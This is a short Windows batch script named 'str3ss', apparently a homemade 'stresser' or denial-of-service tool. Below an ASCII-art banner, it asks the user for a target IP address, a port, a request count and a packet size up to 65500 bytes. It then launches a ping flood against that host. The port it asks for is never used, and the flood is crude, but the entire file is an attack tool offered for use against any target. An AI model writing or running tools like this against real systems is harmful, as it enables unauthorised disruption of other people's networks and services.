@echo off
title str3ss by 3fa0.exe
color 0C
for /l %%a in (1,1,120) do echo|set /p="#"

echo                              """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""
echo                              "   _______ _________ _______  ______   _______  _______   "
echo                              "  (  ____ \\__   __/(  ____ )/ ___  \ (  ____ \(  ____ \  "
echo                              "  | (    \/   ) (   | (    )|\/   \  \| (    \/| (    \/  "
echo                              "  | (_____    | |   | (____)|   ___) /| (_____ | (_____   "
echo                              "  (_____  )   | |   |     __)  (___ ( (_____  )(_____  )  "
echo                              "        ) |   | |   | (\ (         ) \      ) |      ) |  "
echo                              "  /\____) |   | |   | ) \ \__/\___/  //\____) |/\____) |  "
echo                              "  \_______)   )_(   |/   \__/\______/ \_______)\_______)  "
echo                              "                                                          "
echo                              """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""
for /l %%a in (1,1,120) do echo|set /p="#"
echo                                          Logged in as %username% (%ComputerName%)
timeout 1 > NUL
    set /p IP=Target IP adress: 

    set /p PRT=Target open port: 

    set /p RQST=How many requests? 

    set /p SIZE=Size of one request [MAX: 65500]: 

echo Loading assets
for /l %%a in (1,1,120) do echo|set /p="#"

start cmd /C ping %IP% -n %RQST% -l %SIZE%


pause >nul     

